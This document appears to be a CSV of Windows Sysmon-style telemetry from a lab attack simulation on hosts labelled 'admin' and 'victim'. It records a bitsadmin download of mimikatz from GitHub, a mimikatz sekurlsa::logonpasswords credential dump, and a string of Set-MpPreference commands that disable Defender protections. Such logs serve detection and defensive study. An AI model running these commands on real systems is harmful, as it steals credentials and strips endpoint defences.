host.name,process.args,file.path,event.action,user.name.text
admin,NaN,C:\Users\AdministratorDB\AppData\Local\Temp\__PSScriptPolicyTest_ggbl3q00.411.ps1,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\AdministratorDB\AppData\Local\Temp\__PSScriptPolicyTest_oi00ej0i.1go.ps1,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\AdministratorDB\AppData\Local\Temp\__PSScriptPolicyTest_f4uylgug.2by.ps1,File created (rule: FileCreate),AdministratorDB
admin,"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2209.7-0\MpCmdRun.exe, SignatureUpdate, -ScheduleJob, -RestrictPrivileges",NaN,Process Create (rule: ProcessCreate),SYSTEM
admin,"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2209.7-0\MpCmdRun.exe, SignatureUpdate, -ScheduleJob, -RestrictPrivileges, -Reinvoke",NaN,Process Create (rule: ProcessCreate),NETWORK SERVICE
admin,"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2209.7-0\MpCmdRun.exe, SignaturesUpdateService, -ScheduleJob, -UnmanagedUpdate",NaN,Process Create (rule: ProcessCreate),SYSTEM
admin,C:\Users\AdministratorDB\AppData\Local\Temp\RarSFX0\main.exe,NaN,Process Create (rule: ProcessCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\VCRUNTIME140.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-console-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-datetime-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-debug-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-errorhandling-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-file-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-file-l1-2-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-file-l2-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-handle-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-heap-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-interlocked-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-libraryloader-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-localization-l1-2-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-memory-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-namedpipe-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-processenvironment-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-processthreads-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-processthreads-l1-1-1.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-profile-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-rtlsupport-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-string-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-synch-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-synch-l1-2-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-sysinfo-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-timezone-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-core-util-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-crt-conio-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-crt-convert-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-crt-environment-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-crt-filesystem-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-crt-heap-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-crt-locale-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-crt-math-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-crt-process-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-crt-runtime-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-crt-stdio-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-crt-string-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-crt-time-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\api-ms-win-crt-utility-l1-1-0.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\libcrypto-1_1.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\libffi-7.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\libssl-1_1.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\python3.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\python310.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\tcl86t.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\tk86t.dll,File created (rule: FileCreate),AdministratorDB
admin,NaN,C:\Users\ADMINI~1\AppData\Local\Temp\_MEI64882\ucrtbase.dll,File created (rule: FileCreate),AdministratorDB
admin,C:\Users\AdministratorDB\AppData\Local\Temp\RarSFX0\main.exe,NaN,Process Create (rule: ProcessCreate),AdministratorDB
admin,NaN,NaN,Network connection detected (rule: NetworkConnect),AdministratorDB
admin,NaN,NaN,Network connection detected (rule: NetworkConnect),AdministratorDB
admin,NaN,NaN,Dns query (rule: DnsQuery),AdministratorDB
admin,NaN,NaN,Dns query (rule: DnsQuery),AdministratorDB
admin,NaN,NaN,Process terminated (rule: ProcessTerminate),AdministratorDB
admin,"C:\Windows\system32\wuauclt.exe, /UpdateDeploymentProvider, UpdateDeploymentProvider.dll, /ClassId, f9b0614c-ab3f-407b-8b6c-493195e3d68c, /RunHandlerComServer",NaN,Process Create (rule: ProcessCreate),SYSTEM
admin,NaN,C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.377.629.0.exe,File created (rule: FileCreate),SYSTEM
admin,"C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.377.629.0.exe, WD, /q",NaN,Process Create (rule: ProcessCreate),SYSTEM
admin,"C:\Windows\system32\MpSigStub.exe, /stub, 1.1.18500.10, /payload, 1.377.636.0, /MpWUStub, /program, C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.377.629.0.exe, WD, /q",NaN,Process Create (rule: ProcessCreate),SYSTEM
admin,NaN,C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{8D01B7CA-9683-4BFB-A8B0-8F2F9D841F9D}\mpengine.dll,File created (rule: FileCreate),SYSTEM
admin,"taskhostw.exe, -RegisterDevice, -ProtectionStateChanged, -FreeNetworkOnly",NaN,Process Create (rule: ProcessCreate),SYSTEM
admin,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, --type=gpu-process, --disable-gpu-sandbox, --use-gl=disabled, --gpu-vendor-id=5140, --gpu-device-id=140, --gpu-sub-system-id=0, --gpu-revision=0, --gpu-driver-version=10.0.19041.546, --gpu-preferences=UAAAAAAAAADoAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA=, --mojo-platform-channel-handle=4016, --field-trial-handle=2104,i,8290636977795206925,3651593193549184629,131072, /prefetch:2",NaN,Process Create (rule: ProcessCreate),AdministratorDB
admin,NaN,NaN,Process terminated (rule: ProcessTerminate),AdministratorDB
admin,NaN,NaN,Process terminated (rule: ProcessTerminate),AdministratorDB
admin,"C:\Windows\system32\taskmgr.exe, /0",NaN,Process Create (rule: ProcessCreate),AdministratorDB
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Process terminated (rule: ProcessTerminate),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,NaN,NaN,Dns query (rule: DnsQuery),Nicholas Lum
victim,NaN,NaN,Network connection detected (rule: NetworkConnect),Nicholas Lum
victim,"python, main.py",NaN,Process Create (rule: ProcessCreate),Nicholas Lum
victim,"C:\Windows\system32\svchost.exe, -k, wusvcs, -p",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"taskhostw.exe, Logon",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,dwm.exe,NaN,Process Create (rule: ProcessCreate),DWM-2
victim,"LogonUI.exe, /flags:0x2, /state0:0xa3ecb055, /state1:0x41c64e6d",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"taskhostw.exe, KEYROAMING",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,winlogon.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"%%SystemRoot%%\system32\csrss.exe, ObjectDirectory=\Windows, SharedSection=1024,20480,768, Windows=On, SubSystemType=Windows, ServerDll=basesrv,1, ServerDll=winsrv:UserServerDllInitialization,3, ServerDll=sxssrv,4, ProfileControl=Off, MaxRequestThreads=16",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"\SystemRoot\System32\smss.exe, 000000e0, 00000084",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"LogonUI.exe, /flags:0x0, /state0:0xa3ec6055, /state1:0x41c64e6d",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"C:\Windows\System32\mousocoreworker.exe, -Embedding",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,C:\Users\AdministratorDB\Desktop\Perci.bat,File created (rule: FileCreate),Patricia Goh
victim,"C:\Windows\System32\SecurityHealthHost.exe, {08728914-3F57-4D52-9E31-49DAECA5A80A}, -Embedding",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"wmiadap.exe, /F, /T, /R",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,NaN,Dns query (rule: DnsQuery),AdministratorDB
victim,"C:\Windows\ImmersiveControlPanel\SystemSettings.exe, -ServerName:microsoft.windows.immersivecontrolpanel",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files\Windows Defender\mpcmdrun.exe, -wdenable",NaN,Process Create (rule: ProcessCreate),LOCAL SERVICE
victim,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, --type=gpu-process, --disable-gpu-sandbox, --use-gl=disabled, --gpu-vendor-id=5140, --gpu-device-id=140, --gpu-sub-system-id=0, --gpu-revision=0, --gpu-driver-version=10.0.19041.546, --gpu-preferences=UAAAAAAAAADoAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA=, --mojo-platform-channel-handle=1860, --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072, /prefetch:2",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Windows\system32\sc.exe, start, pushtoinstall, registration",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"C:\Windows\system32\ApplicationFrameHost.exe, -Embedding",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,taskhostw.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\powershell.exe.log,File created (rule: FileCreate),SYSTEM
victim,NaN,C:\Windows\Temp\__PSScriptPolicyTest_dxfc4ff0.2vc.ps1,File created (rule: FileCreate),SYSTEM
victim,"powershell.exe, -ExecutionPolicy, Restricted, -Command, Write-Host, 'Final, result:, 1';",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"C:\Windows\system32\NOTEPAD.EXE, C:\Supertools\ps.txt",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,NaN,Process terminated (rule: ProcessTerminate),Patricia Goh
victim,"mimikatz.exe, privilege::debug, sekurlsa::logonpasswords, exit",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,C:\Supertools\Mimikatz\x64\mimispool.dll,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Mimikatz\x64\mimilib.dll,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Mimikatz\x64\mimidrv.sys,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Mimikatz\x64\mimikatz.exe,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Mimikatz\Win32\mimilib.dll,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Mimikatz\Win32\mimilove.exe,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Mimikatz\Win32\mimispool.dll,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Mimikatz\Win32\mimidrv.sys,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Mimikatz\Win32\mimikatz.exe,File created (rule: FileCreate),Patricia Goh
victim,"powershell.exe, -command, Expand-Archive, -Force, 'C:\Supertools\mimikatz.zip', 'C:\Supertools\Mimikatz'",C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive\Microsoft.PowerShell.Archive.psm1,Executing Pipeline,Patricia Goh
victim,"powershell.exe, -command, Expand-Archive, -Force, 'C:\Supertools\mimikatz.zip', 'C:\Supertools\Mimikatz'",C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive\Microsoft.PowerShell.Archive.psm1,Executing Pipeline,Patricia Goh
victim,taskhostw.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_jagpt0da.3qs.ps1,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_p4tfxsga.3gn.ps1,File created (rule: FileCreate),Patricia Goh
victim,"powershell.exe, -command, Expand-Archive -Force 'C:\Supertools\mimikatz.zip' 'C:\Supertools\Mimikatz'",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Windows\system32\svchost.exe, -k, wusvcs, -p",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"bitsadmin, /transfer, Percino, /download, /priority, FOREGROUND, https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip, C:\Supertools\mimikatz.zip",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Windows\System32\svchost.exe, -k, LocalServiceNetworkRestricted, -p",NaN,Process Create (rule: ProcessCreate),LOCAL SERVICE
victim,"C:\Windows\System32\mousocoreworker.exe, -Embedding",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,C:\Program Files\Microsoft Update Health Tools\uhssvc.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_4tguj2yu.2lx.ps1,File created (rule: FileCreate),Patricia Goh
victim,C:\Windows\system32\SgrmBroker.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_nnuq12v2.hdc.ps1,File created (rule: FileCreate),Patricia Goh
victim,"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe, /c",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"powershell.exe, -command, Set-MpPreference -DisableScriptScanning 1",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe, /svc",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,NaN,Process terminated (rule: ProcessTerminate),Patricia Goh
victim,"LogonUI.exe, /flags:0x4, /state0:0xa3edd855, /state1:0x41c64e6d",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_sfhxvtot.b15.ps1,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_fx5flwhy.qgm.ps1,File created (rule: FileCreate),Patricia Goh
victim,"powershell.exe, -command, Set-MpPreference -DisableBlockAtFirstSeen 1",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_f5jgpvjp.swl.ps1,File created (rule: FileCreate),Patricia Goh
victim,NaN,NaN,Dns query (rule: DnsQuery),NETWORK SERVICE
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_bupmu0qj.qn0.ps1,File created (rule: FileCreate),Patricia Goh
victim,"powershell.exe, -command, Set-MpPreference -DisableBehaviorMonitoring 1",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_403v0jwn.3yy.ps1,File created (rule: FileCreate),Patricia Goh
victim,NaN,NaN,Dns query (rule: DnsQuery),SYSTEM
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_trqbtkfu.vxg.ps1,File created (rule: FileCreate),Patricia Goh
victim,"powershell.exe, -command, Set-MpPreference -DisableRealTimeMonitoring 1",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_2q1eoaox.5vq.ps1,File created (rule: FileCreate),Patricia Goh
victim,NaN,NaN,Dns query (rule: DnsQuery),SYSTEM
victim,NaN,NaN,Dns query (rule: DnsQuery),SYSTEM
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_nuo2jgjv.ulg.ps1,File created (rule: FileCreate),Patricia Goh
victim,"C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\identity_helper.exe, --type=utility, --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService, --lang=en-US, --service-sandbox-type=none, --mojo-platform-channel-handle=4288, --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072, /prefetch:8",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\identity_helper.exe, --type=utility, --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService, --lang=en-US, --service-sandbox-type=none, --mojo-platform-channel-handle=4288, --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072, /prefetch:8",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, --type=utility, --utility-sub-type=data_decoder.mojom.DataDecoderService, --lang=en-US, --service-sandbox-type=service, --mojo-platform-channel-handle=4264, --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072, /prefetch:8",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, --type=utility, --utility-sub-type=data_decoder.mojom.DataDecoderService, --lang=en-US, --service-sandbox-type=service, --mojo-platform-channel-handle=4252, --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072, /prefetch:8",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"powershell.exe, -command, Set-MpPreference -SevereThreatDefaultAction 6 -Force",NaN,Process Create (rule: ProcessCreate),Patricia Goh
